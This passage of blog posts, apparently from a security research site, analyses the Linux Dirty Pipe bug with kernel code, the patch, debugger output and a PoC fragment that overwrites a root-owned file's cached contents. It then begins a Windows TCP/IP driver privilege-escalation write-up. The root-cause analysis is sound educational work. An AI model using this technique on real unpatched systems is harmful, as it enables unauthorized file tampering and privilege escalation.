fsize &lt;span style="color:#f92672">-&lt;/span> offset);
size_t copied;
...
copied &lt;span style="color:#f92672">=&lt;/span> copy_folio_to_iter(folio, offset, bytes, iter);
already_read &lt;span style="color:#f92672">+=&lt;/span> copied;
iocb&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ki_pos &lt;span style="color:#f92672">+=&lt;/span> copied;
ra&lt;span style="color:#f92672">-&amp;gt;&lt;/span>prev_pos &lt;span style="color:#f92672">=&lt;/span> iocb&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ki_pos;
...
}
...
folio_batch_init(&lt;span style="color:#f92672">&amp;amp;&lt;/span>fbatch);
} &lt;span style="color:#66d9ef">while&lt;/span> (iov_iter_count(iter) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> iocb&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ki_pos &lt;span style="color:#f92672">&amp;lt;&lt;/span> isize &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!&lt;/span>error);
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/mm/filemap.c#L2645">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>In this function the actual copying (again no real byte-for-byte copy&amp;hellip; see below) of data from the page cache to the pipe takes place. In a loop, the data is copied in chunks by the call to &lt;code>copy_folio_to_iter()&lt;/code>. Note that a &lt;a href="https://lwn.net/Articles/849538/">folio&lt;/a> is not quite the same as a page, but for our purposes this doesn&amp;rsquo;t matter.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">copied &lt;span style="color:#f92672">=&lt;/span> copy_folio_to_iter(folio, offset, bytes, iter);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Besides, however, that if we look closer at the implementation of this operation in &lt;code>copy_page_to_iter_pipe()&lt;/code>, we notice that the data is not actually copied at all!&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> size_t &lt;span style="color:#a6e22e">copy_page_to_iter_pipe&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> page &lt;span style="color:#f92672">*&lt;/span>page, size_t offset, size_t bytes,
&lt;span style="color:#66d9ef">struct&lt;/span> iov_iter &lt;span style="color:#f92672">*&lt;/span>i)
{
...
&lt;span style="color:#66d9ef">struct&lt;/span> pipe_inode_info &lt;span style="color:#f92672">*&lt;/span>pipe &lt;span style="color:#f92672">=&lt;/span> i&lt;span style="color:#f92672">-&amp;gt;&lt;/span>pipe;
&lt;span style="color:#66d9ef">struct&lt;/span> pipe_buffer &lt;span style="color:#f92672">*&lt;/span>buf;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> p_mask &lt;span style="color:#f92672">=&lt;/span> pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ring_size &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> i_head &lt;span style="color:#f92672">=&lt;/span> i&lt;span style="color:#f92672">-&amp;gt;&lt;/span>head;
size_t off;
...
off &lt;span style="color:#f92672">=&lt;/span> i&lt;span style="color:#f92672">-&amp;gt;&lt;/span>iov_offset;
buf &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>bufs[i_head &lt;span style="color:#f92672">&amp;amp;&lt;/span> p_mask];
&lt;span style="color:#66d9ef">if&lt;/span> (off) {
&lt;span style="color:#66d9ef">if&lt;/span> (offset &lt;span style="color:#f92672">==&lt;/span> off &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>page &lt;span style="color:#f92672">==&lt;/span> page) {
&lt;span style="color:#75715e">/* merge with the last one */&lt;/span>
buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>len &lt;span style="color:#f92672">+=&lt;/span> bytes;
i&lt;span style="color:#f92672">-&amp;gt;&lt;/span>iov_offset &lt;span style="color:#f92672">+=&lt;/span> bytes;
&lt;span style="color:#66d9ef">goto&lt;/span> out;
}
i_head&lt;span style="color:#f92672">++&lt;/span>;
buf &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>bufs[i_head &lt;span style="color:#f92672">&amp;amp;&lt;/span> p_mask];
}
...
buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ops &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>page_cache_pipe_buf_ops;
get_page(page);
buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>page &lt;span style="color:#f92672">=&lt;/span> page;
buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>offset &lt;span style="color:#f92672">=&lt;/span> offset;
buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>len &lt;span style="color:#f92672">=&lt;/span> bytes;
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/lib/iov_iter.c#L382">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>We first try to &amp;lsquo;append&amp;rsquo; the current copy operation to an earlier one by increasing the &lt;code>length&lt;/code> of the &lt;code>pipe_buffer&lt;/code> at &lt;code>head&lt;/code>. In case this is not possible, we simply advance the &lt;code>head&lt;/code> and put a &lt;em>reference to&lt;/em> the page we copy into its &lt;code>page&lt;/code> field while making sure that &lt;code>offset&lt;/code> and &lt;code>length&lt;/code> are set correctly. Indeed, the idea behind the efficiency of &lt;code>sys_splice&lt;/code> is to implement it as a &lt;em>zero-copy&lt;/em> operation, where pointers and reference counts are used instead of actually duplicating the data.&lt;/p>
&lt;p>Clearly this code potentially reuses the &lt;code>pipe_buffer&lt;/code>s (&lt;code>buf = &amp;amp;pipe-&amp;gt;bufs[i_head &amp;amp; p_mask]&lt;/code>), and thus all fields &lt;em>must&lt;/em> be checked and maybe re-initialized (there exist some old values, that might not be correct anymore). In particular, the initialization of the &lt;code>flags&lt;/code> is missing. As pointed out by Max Kellermann, it was missing since the &lt;a href="https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b">commit&lt;/a> that introduced this function.&lt;/p>
&lt;h3 id="debugger-1">Debugger&lt;/h3>
&lt;p>We can also observe the effect of the zero-copy operation and missing initialization in the debugger. This is the output from earlier,&lt;/p>
&lt;pre tabindex="0">&lt;code>struct file at 0xffff8881045b0800
&amp;gt; 'f_mapping': 0xffff8881017d9460
&amp;gt; filename: target_file
struct address_space at 0xffff8881017d9460
&amp;gt; 'a_ops': 0xffffffff82226ce0 &amp;lt;ext4_aops&amp;gt;
&amp;gt; 'i_pages.xa_head' : 0xffffea0004156880
struct page at 0xffffea0004156880
&amp;gt; virtual: 0xffff8881055a2000
&amp;gt; data: b'File owned by root!\n'[...]b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
&lt;/code>&lt;/pre>&lt;p>and this is the state of the pipe after splicing&lt;/p>
&lt;pre tabindex="0">&lt;code>struct pipe_inode_info at 0xffff8881044aec00
&amp;gt; 'head': 2
&amp;gt; 'tail': 1
&amp;gt; 'ring_size': 1
&amp;gt; 'bufs': 0xffff888101f8a180
struct pipe_buffer at 0xffff888101f8a180
&amp;gt; 'page': 0xffffea0004156880 &amp;lt;- same page as before
&amp;gt; 'offset': 0
&amp;gt; 'len': 5
&amp;gt; 'ops': 0xffffffff8221cee0 &amp;lt;page_cache_pipe_buf_ops&amp;gt;
&amp;gt; 'flags': PIPE_BUF_FLAG_CAN_MERGE &amp;lt;- flag still set... oopsie :)
&lt;/code>&lt;/pre>&lt;p>The data pointer in the &lt;code>struct address_space&lt;/code> (which represents the page cache&amp;rsquo;s view on the &lt;code>target_file&lt;/code>) and the &lt;code>pipe_buffer&lt;/code> at &lt;code>head&lt;/code> are equal, while the offset and length reflect what our PoC specified in its call to &lt;code>splice&lt;/code>. Note that we are reusing the buffer we emptied earlier, re-initializing all fields &lt;em>but&lt;/em> the flags.&lt;/p>
&lt;h2 id="whats-the-actual-problem">What&amp;rsquo;s the Actual Problem?&lt;/h2>
&lt;p>At this point the problem becomes evident. With &lt;strong>anonymous&lt;/strong> pipe buffers it is allowed to continue the writing where the previous write stopped, which is indicated by the &lt;code>PIPE_BUF_FLAG_CAN_MERGE&lt;/code> flag. With the &lt;strong>file-backed buffers&lt;/strong>, created by splicing, this should not be allowed by the kernel since those pages are &amp;ldquo;owned&amp;rdquo; by the page cache and not by the pipe.&lt;/p>
&lt;p>Thus, when we &lt;code>splice()&lt;/code> the data from a file into a pipe we would have to set &lt;code>buf-&amp;gt;flags = 0&lt;/code> to indicate that it is not okay to append data to an already existing - not fully written - page (&lt;code>buf-&amp;gt;page&lt;/code>) since this page belongs to the page cache (the file). When we &lt;code>pipe_write()&lt;/code> (or in our program just &lt;code>write()&lt;/code>) again we write into the page cache&amp;rsquo;s page because the check &lt;code>buf-&amp;gt;flags &amp;amp; PIPE_BUF_FLAG_CAN_MERGE&lt;/code> is &lt;code>true&lt;/code> (see &lt;code>pipe_write&lt;/code> above if you forgot about that part).&lt;/p>
&lt;p>So the main problem is that we start with an anonymous pipe that will then be &amp;ldquo;turned into&amp;rdquo; a file-backed pipe (not the whole pipe but some buffers) by the &lt;code>splice()&lt;/code> but the pipe does not get this information since &lt;code>buf-&amp;gt;flags&lt;/code> is not set to &lt;code>0&lt;/code> and thus the merging is still allowed.&lt;/p>
&lt;p>The &lt;a href="https://github.com/torvalds/linux/commit/9d2231c5d74e13b2a0546fee6737ee4446017903">patch&lt;/a> is simply adding the missing initialization.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">diff --git a/lib/iov_iter.c b/lib/iov_iter.c
index b0e0acdf96c15e..6dd5330f7a9957 100644
&lt;span style="color:#f92672">--- a/lib/iov_iter.c
&lt;/span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+++ b/lib/iov_iter.c
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span>&lt;span style="color:#75715e">@@ -414,6 +414,7 @@ static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by
&lt;/span>&lt;span style="color:#75715e">&lt;/span>return 0;
buf-&amp;gt;ops = &amp;amp;page_cache_pipe_buf_ops;
&lt;span style="color:#a6e22e">+ buf-&amp;gt;flags = 0;
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> get_page(page);
buf-&amp;gt;page = page;
buf-&amp;gt;offset = offset;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>As we can see above, our PoC arranged for the &lt;code>PIPE_BUF_FLAG_CAN_MERGE&lt;/code> flag to be set on the pipe buffer re-used for the splice. Thus, the last write will trigger the bug.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">pause_for_inspection(&lt;span style="color:#e6db74">&amp;#34;About to write() into page cache&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">if&lt;/span> (write(pipefds[&lt;span style="color:#ae81ff">1&lt;/span>], &lt;span style="color:#e6db74">&amp;#34;pwned by user&amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">13&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">13&lt;/span>) {
exit(&lt;span style="color:#ae81ff">1&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L81">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>Back in the debugger, we can see that the final invocation of &lt;code>pipe_write()&lt;/code> appends to the partially filled &lt;code>pipe_buffer&lt;/code> that is backed by the page cache.&lt;/p>
&lt;pre tabindex="0">&lt;code>struct address_space at 0xffff8881017d9460
&amp;gt; 'a_ops': 0xffffffff82226ce0 &amp;lt;ext4_aops&amp;gt;
&amp;gt; 'i_pages.xa_head' : 0xffffea0004156880
struct pipe_inode_info at 0xffff8881044aec00
&amp;gt; 'head': 2
&amp;gt; 'tail': 1
&amp;gt; 'ring_size': 1
&amp;gt; 'bufs': 0xffff888101f8a180
struct pipe_buffer at 0xffff888101f8a180
&amp;gt; 'page': 0xffffea0004156880
&amp;gt; 'offset': 0
&amp;gt; 'len': 18
&amp;gt; 'ops': 0xffffffff8221cee0 &amp;lt;page_cache_pipe_buf_ops&amp;gt;
&amp;gt; 'flags': PIPE_BUF_FLAG_CAN_MERGE
struct page at 0xffffea0004156880
&amp;gt; virtual: 0xffff8881055a2000
&amp;gt; data: b'File pwned by user!\n'[...]b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
&lt;/code>&lt;/pre>&lt;p>Here we can see that &lt;code>owned by root&lt;/code> (starting at index 5 of &amp;ldquo;File owned by root!&amp;quot;) has been overwritten with &lt;code>pwned by user&lt;/code> in the page cache.&lt;/p>
&lt;p>In the shell we can confirm that the file contents changed for all processes on the system&lt;/p>
&lt;pre tabindex="0">&lt;code>user@lkd-debian-qemu:~$ ./poc
user@lkd-debian-qemu:~$ cat target_file
File pwned by user!
user@lkd-debian-qemu:~$ exit
root@lkd-debian-qemu:~# echo 1 &amp;gt; /proc/sys/vm/drop_caches
[ 232.397273] bash (203): drop_caches: 1
root@lkd-debian-qemu:~# su user
user@lkd-debian-qemu:~$ cat target_file
File owned by root
&lt;/code>&lt;/pre>&lt;p>You can also see that the changes to the file&amp;rsquo;s page cache data are not written back to disk. After clearing the page cache, the old content appears again. But, all other programs would use the modified version from the page cache since the kernel transparently offers you the cached version of the file data (that&amp;rsquo;s the purpose of the page cache).&lt;/p>
&lt;h3 id="limitations">Limitations&lt;/h3>
&lt;p>There are some inherent limitations to the writes that we can perform using this technique that are due to implementation of the pipe and page cache that Max Kellermann mentions:&lt;/p>
&lt;blockquote>
&lt;p>the attacker must have read permissions (because it needs to splice() a page into a pipe)&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>the offset must not be on a page boundary (because at least one byte of that page must have been spliced into the pipe)&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>the write cannot cross a page boundary (because a new anonymous buffer would be created for the rest)&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>the file cannot be resized (because the pipe has its own page fill management and does not tell the page cache how much data has been appended)&lt;/p>
&lt;/blockquote>
&lt;h2 id="approaches-to-understand-the-bug">Approaches to Understand the Bug&lt;/h2>
&lt;h3 id="top-down-vs-bottom-up-vs-hybrid">Top Down vs. Bottom Up vs. Hybrid&lt;/h3>
&lt;p>Given a PoC and a patch there are different approaches to investigate the vulnerability.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>Top Down&lt;/strong>: find the &lt;code>splice()&lt;/code>, &lt;code>write()&lt;/code>, &lt;code>read()&lt;/code> system call implementation and go deeper.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Bottom Up&lt;/strong>: have a look at the fix: &lt;a href="https://github.com/torvalds/linux/commit/9d2231c5d74e13b2a0546fee6737ee4446017903">https://github.com/torvalds/linux/commit/9d2231c5d74e13b2a0546fee6737ee4446017903&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">diff --git a/lib/iov_iter.c b/lib/iov_iter.c
index b0e0acdf96c15e..6dd5330f7a9957 100644
&lt;span style="color:#f92672">--- a/lib/iov_iter.c
&lt;/span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+++ b/lib/iov_iter.c
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span>&lt;span style="color:#75715e">@@ -414,6 +414,7 @@ static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by
&lt;/span>&lt;span style="color:#75715e">&lt;/span> return 0;
buf-&amp;gt;ops = &amp;amp;page_cache_pipe_buf_ops;
&lt;span style="color:#a6e22e">+ buf-&amp;gt;flags = 0;
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> get_page(page);
buf-&amp;gt;page = page;
buf-&amp;gt;offset = offset;
&lt;span style="color:#75715e">@@ -577,6 +578,7 @@ static size_t push_pipe(struct iov_iter *i, size_t size,
&lt;/span>&lt;span style="color:#75715e">&lt;/span> break;
buf-&amp;gt;ops = &amp;amp;default_pipe_buf_ops;
&lt;span style="color:#a6e22e">+ buf-&amp;gt;flags = 0;
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> buf-&amp;gt;page = page;
buf-&amp;gt;offset = 0;
buf-&amp;gt;len = min_t(ssize_t, left, PAGE_SIZE);
&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>find &lt;code>lib/iov_iter.c&lt;/code> (more concrete the functions &lt;code>copy_page_to_iter_pipe()&lt;/code> and &lt;code>push_pipe()&lt;/code>) and your way back to the system calls.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Hybrid&lt;/strong>: start from &lt;code>splice()&lt;/code> system call but know where we will end (either of the patched functions from above)&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="linux-kernel-source">Linux Kernel Source&lt;/h3>
&lt;p>Access to the source code:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://github.com/torvalds/linux">https://github.com/torvalds/linux&lt;/a> + ctags + cscope (&lt;code>make cscope tags&lt;/code>) or an IDE that is capable of creating cross references (might be very resource hungry because of the kernel&amp;rsquo;s size!)&lt;/li>
&lt;li>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source">https://elixir.bootlin.com/linux/v5.17.9/source&lt;/a> (cross references already created + no need for extra tools)&lt;/li>
&lt;/ul>
&lt;p>When reading kernel source code for the first time, you might encounter some obstacles. In general it is easy to get lost and thus you should always keep in mind what it is that you are interested in finding / understanding. We must also understand that it is &lt;em>impossible&lt;/em> to understand every line of the code that we look at. Use a best-effort approach to understand the things that get you closer to you goal). You will encounter:&lt;/p>
&lt;ul>
&lt;li>lots of error checking: in general &lt;em>very&lt;/em> interesting, however, here we ignore it (i.e. &lt;code>return -EXYZ&lt;/code> code paths)&lt;/li>
&lt;li>many layers of macros, (inlined) function calls and definitions: collect everything and simplify it. Note: you cannot set breakpoints on macros, which might be a problem as well.&lt;/li>
&lt;li>structures full of function pointers:
&lt;ul>
&lt;li>for example, look under &amp;ldquo;Referenced in [&amp;hellip;] files&amp;rdquo; on &lt;a href="https://elixir.bootlin.com">https://elixir.bootlin.com&lt;/a>&lt;/li>
&lt;li>&amp;ldquo;decide&amp;rdquo; for some implementation (in our case ext2 file system)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>conditional compilation depending on:
&lt;ul>
&lt;li>compile time options: check the config files you used for your build &lt;code>.config&lt;/code>&lt;/li>
&lt;li>processor architecture: go for &lt;code>x86-64&lt;/code> if present, else take the generic version&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="conclusion">Conclusion&lt;/h2>
&lt;p>A detailed and streamlined analysis of any bug makes it seem shallow, however, don&amp;rsquo;t get fooled by that impression. Making sense of the bug requires a conceptual understanding of multiple interacting subsystems of the Linux kernel. A root cause analysis without a PoC, blog post, or patch at hand would be a tricky task. In general, the nature of this bug makes it a great opportunity to learn about the Linux kernel. A missing initialization is a welcome diversion from the ubiquitous memory corruption issues (that a lot of exploit developers love ;)). Furthermore, in contrast to those kind of vulnerabilities, the exploitation of this one is almost trivial, stable, and it works across a huge range of Linux distributions. Maybe you got motivated to check out some more complex vulnerabilities / exploits or the Linux kernel yourself :).&lt;/p></content></item><item><title>Exploiting CVE-2021-43247</title><link>https://lolcads.github.io/posts/2022/06/exploiting_cve_2021_43247/</link><pubDate>Thu, 02 Jun 2022 10:59:55 +0200</pubDate><guid>https://lolcads.github.io/posts/2022/06/exploiting_cve_2021_43247/</guid><description>In this blog post I will go in depth into the inner workings of CVE-2021-43247, which was fixed on the 14th of December 2021. This bug was classified as &amp;ldquo;Windows TCP/IP Driver Elevation of Privilege Vulnerability&amp;rdquo;. The vulnerability itself was probably dormant for a long time, but became exploitable when the AF_UNIX address family was first introduced in 2019.
I will also take this as an excuse to explain in detail, what drivers are, how user space communicates with drivers, what a Local Privilege Escalation (LPE) is and what how we can achieve it in this case.</description><content>&lt;p>In this blog post I will go in depth into the inner workings of &lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2021-43247">CVE-2021-43247&lt;/a>, which was fixed on the 14th of December 2021.
This bug was classified as &amp;ldquo;Windows TCP/IP Driver Elevation of Privilege Vulnerability&amp;rdquo;.
The vulnerability itself was probably dormant for a long time, but became exploitable when the &lt;code>AF_UNIX&lt;/code> address family
was first introduced in 2019.&lt;/p>
&lt;p>I will also take this as an excuse to explain in detail, what drivers are, how user space communicates with drivers,
what a Local Privilege Escalation (LPE) is and what how we can achieve it in this case.&lt;/p>
&lt;h2 id="the-goal--what-is-an-lpe-local-privilege-escalation">The goal / what is an LPE (Local Privilege Escalation)&lt;/h2>
&lt;p>A Local Privilege Escalation (sometimes also called Elevation of Privilege or EoP) is an exploit which obtains some privilege
that it is not supposed to be able to get. In the traditional cases (as in this one) this means we start out with at normal
user shell and end up with administrator access. On Linux this would be about obtaining a root shell.
This is usually done through a bug in a privileged process, a bug in a driver or a bug in the operating system itself.&lt;/p>
&lt;p>As the CVE description tells us, we are dealing with a bug in the TCP/IP driver.&lt;/p>
&lt;h2 id="what-are-drivers-and-how-does-user-space-communicate-with-them">What are drivers and how does user space communicate with them?&lt;/h2>
&lt;p>Drivers are simply &lt;a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format">PE files&lt;/a>, which the kernel loads into the kernel address space.
PE (Portable Executable) is the executable file format used by Windows, it&amp;rsquo;s used by &amp;ldquo;.exe&amp;rdquo; and &amp;ldquo;.dll&amp;rdquo; files.
Drivers usually have the file extension &amp;ldquo;.sys&amp;rdquo;, but there are also library drivers which also get the &amp;ldquo;.dll&amp;rdquo; file extension.
Most drivers are contained in the &amp;ldquo;C:\windows\system32\drivers&amp;rdquo; directory.
What drivers are loaded on system startup is determined by the registry and the physical devices available to the system.&lt;/p>
&lt;p>User space can communicate with the loaded drivers using kernel system calls (or syscalls for short). For example, consider the program&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">// blog_socket.c - small example program used in this blog
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;winsock.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>() {
&lt;span style="color:#75715e">// Initialize WinSock
&lt;/span>&lt;span style="color:#75715e">&lt;/span> WSAStartup(MAKEWORD(&lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>), &lt;span style="color:#f92672">&amp;amp;&lt;/span>(WSADATA){&lt;span style="color:#ae81ff">0&lt;/span>});
&lt;span style="color:#75715e">// Create a TCP/IPv4 socket.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> SOCKET Socket &lt;span style="color:#f92672">=&lt;/span> socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
&lt;span style="color:#75715e">// Bind the socket to any address
&lt;/span>&lt;span style="color:#75715e">&lt;/span> bind(Socket, &lt;span style="color:#f92672">&amp;amp;&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> sockaddr){AF_INET}, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> sockaddr));
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then we can observe the following call stack:&lt;/p>
&lt;pre tabindex="0">&lt;code>00 ntdll!NtCreateFile
01 mswsock!SockSocket+0x56e
02 mswsock!WSPSocket+0x23a
03 WS2_32!WSASocketW+0x130
04 WS2_32!socket+0x6e
05 blog_socket!main+0x84
&lt;/code>&lt;/pre>&lt;p>&lt;code>ntdll!NtCreateFile&lt;/code> is the function that actually transitions into the kernel address space.
The assembly for all &lt;code>ntdll!NtXxx&lt;/code> functions looks something like the following:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-asm" data-lang="asm">NtCreateFile:
&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">r10&lt;/span>, &lt;span style="color:#66d9ef">rcx&lt;/span> &lt;span style="color:#75715e">; load the first argument into r10, as the syscall
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">; instruction uses rcx as the return location
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">mov&lt;/span> &lt;span style="color:#66d9ef">eax&lt;/span>, &lt;span style="color:#ae81ff">0x55&lt;/span> &lt;span style="color:#75715e">; load the syscall value into eax (0x55 is &amp;#39;NtCreateFile&amp;#39;)
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#66d9ef">test&lt;/span> &lt;span style="color:#66d9ef">byte&lt;/span> &lt;span style="color:#66d9ef">ptr&lt;/span> [.&lt;span style="color:#66d9ef">Running32Bit&lt;/span>], &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#75715e">; check if we are running a 32bit executable
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">jnz&lt;/span> &lt;span style="color:#66d9ef">.Syscallx86&lt;/span>
&lt;span style="color:#75715e">; syscall transitions into the kernel.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">systcall&lt;/span>
&lt;span style="color:#a6e22e">ret&lt;/span>
.Syscallx86:
&lt;span style="color:#75715e">; x86 does not have a syscall instruction, use int 0x2e instead of syscall.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">int&lt;/span> &lt;span style="color:#ae81ff">0x2e&lt;/span>
&lt;span style="color:#a6e22e">ret&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We will only focus on the x64 case here. The syscall instruction loads the new instruction pointer from a
specialized hardware registers (called a model specific register or MSR). Namely, the MSR &lt;code>IA32_LSTAR&lt;/code>.
It also stores the &lt;code>return&lt;/code> address (in this case the address of the &lt;code>ret&lt;/code> instruction) into &lt;code>rcx&lt;/code> and sets the privilege
level of the processor to 0. This is why kernel mode is sometimes referred to as ring 0.&lt;/p>
&lt;p>When the processor is running at privilege level 0, it can access kernel space memory.
Here it is important to know that the address space does not change, but at non-zero privilege level the processor
faults when it is accessing a page which does not have the &lt;code>USER&lt;/code> bit set in the page table.&lt;/p>
&lt;p>In Windows 10 the &lt;code>IA32_LSTAR&lt;/code> MSR points to the function &lt;code>nt!KiSystemCall64&lt;/code>, which first establishes a stack pointer:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-asm" data-lang="asm">KiSystemCall64:
&lt;span style="color:#a6e22e">swapgs&lt;/span> &lt;span style="color:#75715e">; load saved kernel thread locals from some MSR
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">mov&lt;/span> &lt;span style="color:#66d9ef">gs&lt;/span>:[&lt;span style="color:#66d9ef">gs.user_stack&lt;/span>], &lt;span style="color:#66d9ef">rsp&lt;/span> &lt;span style="color:#75715e">; save user stack, in the kernel thread locals
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">mov&lt;/span> &lt;span style="color:#66d9ef">rsp&lt;/span>, &lt;span style="color:#66d9ef">gs&lt;/span>:[&lt;span style="color:#66d9ef">gs.kernel_stack&lt;/span>] &lt;span style="color:#75715e">; load kernel space stack, from the thread locals
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e">; ... from here we are just in kernel space, and can do whatever we want
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">; e.g. Save all the registers and then call the according NtXxx
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">; kernel function depending on eax.
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The kernel then figures out what kernel function was requested by looking at &lt;code>eax&lt;/code> and transitions to it.
In this case we end up in &lt;code>nt!NtCreateFile&lt;/code> (on the kernel side).&lt;/p>
